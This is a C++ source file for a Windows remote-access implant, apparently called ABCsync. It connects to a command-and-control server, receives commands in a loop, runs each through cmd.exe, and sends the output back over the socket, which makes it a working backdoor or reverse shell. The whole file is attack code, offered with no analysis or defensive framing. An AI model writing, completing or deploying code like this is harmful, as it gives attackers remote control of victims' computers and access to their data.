#include "ABCsync.h"
#include <iostream>
#include <winsock2.h>
#include <windows.h>

// Initialize the socket
SOCKET c2Socket;

// Method to connect to the C2 server
bool ABCsync::connectToC2(const std::string& c2Address, int port) {
    WSADATA wsaData;
    sockaddr_in serverAddr;

    std::cout << "[*] Initializing Winsock..." << std::endl;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[!] Failed to initialize Winsock. Error: " << WSAGetLastError() << std::endl;
        return false;
    }

    c2Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (c2Socket == INVALID_SOCKET) {
        std::cerr << "[!] Failed to create socket. Error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(c2Address.c_str());

    std::cout << "[*] Connecting to C2 server at " << c2Address << ":" << port << "..." << std::endl;
    if (connect(c2Socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "[!] Failed to connect to C2 server. Error: " << WSAGetLastError() << std::endl;
        closesocket(c2Socket);
        WSACleanup();
        return false;
    }

    std::cout << "[*] Connected to C2 server." << std::endl;

    char buffer[1024];
    int bytesRead;
    while ((bytesRead = recv(c2Socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesRead] = '\0';

        // Ensure the data is valid ASCII
        bool validCommand = true;
        for (int i = 0; i < bytesRead; ++i) {
            if (buffer[i] < 32 || buffer[i] > 126) {  // Non-printable characters
                validCommand = false;
                break;
            }
        }

        if (!validCommand) {
            std::cerr << "[!] Received invalid command or binary data." << std::endl;
            continue;  // Skip execution for invalid/binary data
        }

        std::cout << "[*] Received command: " << buffer << std::endl;
        executeRemoteCommand(buffer);
    }

    closesocket(c2Socket);
    WSACleanup();
    return true;
}

// Method to execute a received command
bool ABCsync::executeRemoteCommand(const std::string& command) {
    std::string adjustedCommand = command;

    // Translate Linux-specific commands to Windows equivalents
    if (command == "pwd") {
        adjustedCommand = "cd";  // In Windows, "cd" prints the current directory
    } else if (command == "ls") {
        adjustedCommand = "dir";  // In Windows, "dir" lists directory contents
    }

    std::cout << "[*] Executing command: " << adjustedCommand << std::endl;
    return executeCommand(adjustedCommand);
}

// Method to execute the command locally and send the output back to the C2 server
bool ABCsync::executeCommand(const std::string& command) {
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdOutRead, hStdOutWrite;
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
        std::cerr << "[!] Failed to create pipe." << std::endl;
        return false;
    }

    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFOW siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
    siStartInfo.cb = sizeof(STARTUPINFOW);
    siStartInfo.hStdError = hStdOutWrite;
    siStartInfo.hStdOutput = hStdOutWrite;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    std::string cmd = "cmd.exe /c " + command;
    wchar_t cmdLine[1024];
    mbstowcs(cmdLine, cmd.c_str(), sizeof(cmdLine));

    // Create a process to execute the command
    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        std::cerr << "[!] Failed to execute command." << std::endl;
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return false;
    }

    // Wait for the process to finish
    WaitForSingleObject(piProcInfo.hProcess, INFINITE);

    DWORD bytesRead;
    char buffer[4096];
    bool success = false;

    // Read the output from the pipe
    if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        std::cout << "[*] Command output: " << buffer << std::endl;

        // Send the command output back to the C2 server
        send(c2Socket, buffer, bytesRead, 0);

        success = true;
    }

    // Cleanup
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);

    return success;
}
